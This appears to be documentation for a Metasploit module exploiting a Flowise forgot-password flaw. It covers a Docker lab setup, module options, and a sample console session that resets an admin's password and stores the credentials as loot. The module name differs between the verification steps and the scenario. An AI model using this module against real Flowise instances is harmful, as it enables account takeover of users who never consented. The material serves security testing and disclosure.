## Vulnerable Application

In Flowise versions 3.0.5 and earlier, the `forgot-password` endpoint in Flowise returns sensitive information including
a valid password reset `tempToken` without authentication or verification. This enables any attacker to generate a reset
token for arbitrary users and directly reset their password, leading to a complete account takeover (ATO).

The vulnerability affects:

    *  flowise <= 3.0.5

This module was successfully tested on:

    * flowise 3.0.4 installed with Docker


### Installation
1. Pull & run a Flowise docker container (v3.0.4) in your VM.
```
docker run -d \
--name flowise \
--network flowise-net \
-p 3000:3000 \
-e SMTP_HOST=mailhog \
-e SMTP_PORT=1025 \
-e SMTP_SECURE=false \
-e SMTP_USER=test \
-e SMTP_PASSWORD=test \
-v flowise-data:/root/.flowise \
flowiseai/flowise:3.0.4
```
2. Pull and run Mailwise docker container in your VM.
```
docker run -d \
--name mailhog \
--network flowise-net \
-p 1025:1025 \
-p 8025:8025 \
mailhog/mailhog
```


## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use exploit/multi/http/flowise_auth_bypass_cve-2025_58434`
4. Do: `run rhost=<rhost> email=<email> newpassword=<new password>`
5. You should get a status success message indicating that the new username and password have been stored to loot.


## Options

### EMAIL (required)

Email address of the Flowise user whose password is to be reset

### NEWPASSWORD (required)

The new password of the targeted Flowise user.
NOTE: Flowise does not accept empty strings as passwords.


## Scenarios
```
msf > use auxiliary/gather/flowise_auth_bypass_cve_2025_58434
msf auxiliary(gather/flowise_auth_bypass_cve_2025_58434) > set RHOSTS 192.168.1.30
RHOSTS => 192.168.1.30
msf auxiliary(gather/flowise_auth_bypass_cve_2025_58434) > set EMAIL admin@local.com
EMAIL => admin@local.com
msf auxiliary(gather/flowise_auth_bypass_cve_2025_58434) > set NEWPASSWORD password123
NEWPASSWORD => password123
msf auxiliary(gather/flowise_auth_bypass_cve_2025_58434) > run
[*] Running module against 192.168.1.30
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Flowise version 3.0.4 is in the vulnerable range
[+] Password reset successful. Loot stored in: /home/richard/.msf4/loot/20260806210741_default_192.168.1.30_flowise.files_888141.txt
[*] Auxiliary module execution completed
msf auxiliary(gather/flowise_auth_bypass_cve_2025_58434) >
```
